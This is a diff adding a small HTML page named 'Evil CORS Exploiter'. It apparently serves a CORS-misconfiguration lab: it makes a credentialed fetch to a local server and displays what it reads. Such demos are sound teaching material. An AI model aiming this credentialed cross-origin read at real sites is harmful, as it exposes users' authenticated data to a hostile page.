@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil CORS Exploiter</title>
+</head>
+<body>
+    <h1>Evil CORS Exploiter</h1>
+    <button onclick="exploitCORS()">Exploit CORS</button>
+    <div id="exploitedData"></div>
+
+    <script>
+        function exploitCORS() {
+            fetch('http://localhost:1337/exploit-cors', { credentials: 'include' })
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('exploitedData').innerText = data.data;
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
+
